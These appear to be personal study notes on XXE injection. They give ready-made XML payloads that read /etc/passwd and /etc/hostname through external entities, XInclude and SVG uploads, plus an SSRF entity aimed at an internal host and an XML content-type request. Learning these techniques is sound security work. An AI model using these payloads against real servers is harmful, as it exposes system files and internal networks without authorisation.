## Exploiting XXE to retrieve files
To perform an XXE injection attack that retrieves an arbitrary file from the server's filesystem you need to modify the submitted XML in two ways:
* Introduce a `DOCTYPE` element that defines an external entity containing the path to the file
* Edit a data value in the XML that is returned in the application's response, to make use of the defined external entity
Example:
```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> 
<stockCheck><productId>&xxe;</productId></stockCheck>
```

## Exploiting XXE to perform [[SSRF]] attacks
Example:
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

## [[Blind XXE]]

## Finding hidden attack surface for XXE injection
### XInclude attacks
Some applications receive client-submitted data, embed it on the server side into an XML doucment, and then parse the document.

In this situation you cannot carry out a classic XXE attack, beacuse you don't control the entire XML document. However you might be able to use `XInclude` instead. `XInclude` is a part of the XML specification that allows an XML document to be built from sub-documents.

Example:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"> 
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

### XXE attacks via file upload
Some common file formats use XML or contain XML subcomponents. Formats like this are DOCX and SVG.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
   "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"
   [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>

<svg width="1000" height="400"  
	 xmlns="http://www.w3.org/2000/svg" 
	 xmlns:xlink="http://www.w3.org/1999/xlink" >
	<text x="10" y="100" font-size="100" >&xxe;</text>
</svg>
```

### XXE attacks via modified content type
Some web sites expect to receive requests in the HTML forms format but will tolerate other content types including XML.

```txt
POST /action HTTP/1.0 
Content-Type: text/xml 
Content-Length: 52 

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```